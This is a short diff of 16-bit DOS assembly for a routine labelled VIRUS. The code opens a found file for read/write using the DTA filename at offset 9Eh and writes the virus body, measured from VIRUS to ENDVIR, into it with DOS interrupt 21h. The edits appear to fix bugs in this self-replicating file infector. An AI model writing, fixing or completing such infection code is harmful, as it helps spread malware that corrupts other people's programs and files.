@@ -18,7 +18,7 @@ VIRUS:
 SEARCH_LP:
     jc DONE
     mov ax,3D02H 
-    mov dx,FNAME
+    mov dx,9EH
     int 21H 
     mov bx,ax
     
@@ -30,7 +30,7 @@ SEARCH_LP:
     mov cx, OFFSET ENDVIR - OFFSET VIRUS
     ;lea dx,[di+VIRUS]  
     mov dx,100h
-    xchg ax,bx 
+    ;xchg ax,bx 
     mov ah,40H
     int 21H
     
